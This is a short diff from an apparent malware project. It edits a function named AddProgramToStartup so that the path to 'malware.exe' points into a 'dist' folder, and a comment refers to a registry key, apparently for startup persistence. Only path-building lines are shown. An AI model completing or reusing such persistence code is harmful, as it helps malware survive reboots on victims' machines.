@@ -9,8 +9,10 @@ def AddProgramToStartup():
 
     fp=os.path.dirname(os.path.realpath(__file__))
     file_name ="malware.exe"
+    dist = "dist"
 
-    new_file_path = fp+"\\"+file_name
+    new_file_path = fp+"\\"+dist+"\\"+file_name
+
 
     ##KeyVal is a raw string variable containing registry key name.
 
